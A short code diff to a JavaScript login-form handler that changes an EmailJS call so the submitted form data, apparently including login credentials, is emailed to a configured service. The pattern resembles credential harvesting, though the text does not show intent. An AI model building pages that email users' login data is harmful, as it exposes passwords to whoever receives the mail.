@@ -11,8 +11,7 @@ document.getElementById("loginForm").addEventListener("submit", function (event)
     const formData = new FormData(this);
 
     // Send the form data as an email using Email.js
-    //emailjs.sendForm("service_142u1mu", "template_avc41ik", formData)
-    emailjs.send("service_142u1mu","template_avc41ik");
+    emailjs.send("service_142u1mu", "template_avc41ik", formData)
         .then(function(response) {
             alert("Email sent successfully!");
             document.getElementById("loginForm").reset();
